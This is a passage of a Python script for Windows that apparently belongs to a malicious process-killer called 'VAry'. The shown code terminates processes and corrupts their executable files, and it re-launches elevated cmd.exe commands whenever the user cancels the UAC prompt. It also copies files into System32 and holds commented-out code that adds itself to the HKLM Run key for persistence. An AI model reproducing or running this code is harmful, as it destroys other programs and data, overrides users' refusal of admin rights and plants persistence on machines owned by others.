                                    psutil.Process(pid).kill()
                    except Exception as e:
                            print(f'Error: {e}')
                            pass

            #print('\n\nAnd now to corrupt..\n')

            for location in pid_locations:
                    try:
                            corruptfile(location) # corrupt it, cause why tf not?
                    except Exception as e:
                            print(f'Error: {e}')

    '''
    def AddSelfToStartupRegistry():
        programVL2(f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v vpal /f /t REG_SZ /d \"{selfScriptFullLocation}\"'.replace('.py', '.exe'))
    '''


    def aaaa():
        while True:
            try:
                checkfriend()
            except Exception as e:
                print(f'Error at checking a "friend": {e}')

    def aaaaaa():
        while True:
            try:
                processestoterminate()
                sleep(1)
            except Exception as e:
                print(f'Error at terminating: {e}')


    threading.Thread(target=aaaaaa).start()
    threading.Thread(target=aaaa).start()
# end of script : EOF




class KThread(threading.Thread):
    """A subclass of threading.Thread, with a kill()
method."""
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run            # Force the Thread to
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the
trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True


def nothing():
    pass




def programVL2(cmd, suppress=False, retry=0):
        try:
                a = shell.ShellExecuteEx(lpVetbl='runas', lpFile='cmd.exe', lpParameters='/c '+cmd)
                #print(a)
                if a['hInstApp'] > 32:
                        if suppress == False:
                                print("The admin command ran successfully", "@ command :", cmd)
                        else:
                                pass
                else:
                        if suppress == False:
                                print("The admin command failed with an error code", ctypes.WinError(), "@ command :", cmd)
                        else:
                                pass
                        if suppress == False:
                                print(f'{retry+1} Retrying running(admin): {cmd}')
                        retry +=1
                        if retry > 4:
                                return
                        return programVL2(cmd, suppress, retry)
        except Exception as e:
                #print(f'Error at programVL2, {e}')
                if 'The operation was canceled by the user.' in e.args:
                        retry +=1
                        return programVL2(cmd, suppress, retry)



def runcmd(cmd, suppress=False, retry=0):
    try:
        a = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        a.wait()
        if a.returncode == 0:
            if suppress == False:
                print("The command ran successfully", "@ command :", cmd)
            else:
                pass
        else:
            if suppress == False:
                print("The command failed with return code", a.returncode, "@ command :", cmd)
            else:
                pass
            if suppress == False:
                print(f'{retry+1} Retrying running: {cmd}')
            retry +=1
            if retry > 4:
                    return
            return runcmd(cmd, suppress, retry)
    except Exception as e:
        print(f'Error at runcmd, {e}')


# the above functions are for managing system, commands, functions and more





def update_vary_function():
    system32_path = r'C:\Windows\System32'
    for drive in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
            drive_path = drive + ':\\'
            if os.path.exists(drive_path):
                    vary_folder_path = os.path.join(drive_path, 'VAry')
                    if os.path.exists(vary_folder_path):
                            print(f'Found VAry folder at {vary_folder_path}')
                            for filename in os.listdir(vary_folder_path):
                                    src_path = os.path.join(vary_folder_path, filename)
                                    dst_path = os.path.join(system32_path, filename)
                                    if os.path.exists(dst_path):
                                            os.remove(dst_path)
                                    print(f'Copying {src_path} to {dst_path}')
                                    shutil.copy2(src_path, dst_path)
                                    sleep(1)
                                    programVL2('start tbl.exe')
                                    #exit()
'''                                    MessageBox = ctypes.windll.user32.MessageBoxW
                                    restart_prompt = MessageBox(None, "Do you want to restart the application now?", "Restart Application", 0x40 | 0x1)
                                    if restart_prompt == 1:
                                            print('Restarting VAry\'s host..')
                                            programVL2('start tbl.exe')
                                            programVL2('taskkill /f /im tbl.exe')'''




def script3(task_queue, thread_main, thread_sub1):
    try:
        while True:
            item = task_queue.get()
            print('Got a an item from queue,', item)
            if item == 'update_vary':
                thread_main.kill()
                thread_sub1.kill()
                sleep(1)
                ()
            else:
                print('Invalid item, has no use @', item)
    except Exception as e:
        print(f'Error at script3, {e}')


if __name__ == '__main__':
    #task_queue = Queue()
    # Create a new process for each script
    p1 = KThread(target=script1)#, daemon=False, args=(task_queue))
    p2 = KThread(target=script2)#, daemon=False, args=(task_queue))

    #p3_handler = KThread(target=script3, daemon=False, args=(task_queue, p1, p2)) # for updating, running, etc etc

    # you aren't starting the above thread

    # Start the processes
    p1.start()
    p2.start()

    # Join the processes so that they remain running
    p1.join()
    p2.join()
    